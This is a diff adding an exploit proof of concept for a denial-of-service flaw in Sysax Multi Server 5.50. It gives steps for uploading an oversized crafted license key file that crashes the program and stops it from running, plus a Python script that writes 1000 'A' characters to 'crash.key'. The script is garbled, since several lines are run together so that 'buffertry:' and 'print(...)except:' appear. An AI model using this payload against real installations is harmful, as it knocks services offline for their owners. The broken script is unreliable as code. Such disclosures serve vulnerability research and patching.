@@ -1,0 +1,27 @@
+# Exploit Title: Sysax Multi Server 5.50 - Denial of Service (PoC)
+# Google Dork: NA
+# Date: 2020-01-20
+# Exploit Author: Shailesh Kumavat
+# Vendor Homepage: https://www.sysax.com/
+# Software Link: https://www.sysax.com/download.htm#sysaxserv
+# Version: Sysax Multi Server 5.50
+# Tested on: WIndow 7
+# CVE : [if applicable]
+
+1) Download software install in window 7
+2)run software then click install license
+3) upload crash.key file and it will show run again this program
+4 ) program crash , never run
+
+
+#!/usr/bin/python
+
+buffer = "A" * 1000
+
+payload = buffertry:
+    f=open("crash.key","w")
+    print("[+] Creating %s bytes evil payload." %len(payload))
+    f.write(payload)
+    f.close()
+    print("[+] File created!")except:
+    print("File cannot be created.")
